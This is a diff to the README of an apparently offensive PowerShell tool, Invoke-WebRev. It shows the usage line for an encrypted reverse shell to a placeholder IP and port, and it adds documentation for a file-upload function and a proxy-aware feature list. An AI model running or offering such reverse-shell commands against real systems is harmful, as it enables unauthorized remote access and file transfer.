@@ -26,7 +26,16 @@ Reverse Shell with encryption:
     Invoke-WebRev -ssl -ip IP -port PORT
 ```
 
-# Future features
+# Extra functions
+```
+Upload
+    Usage: upload /src/path/file C:\dest\path\file
+```
+
+# Features
     - Proxy Aware
+    - Upload Function
+
+# Future features
     - Autocomplete
     - Download function
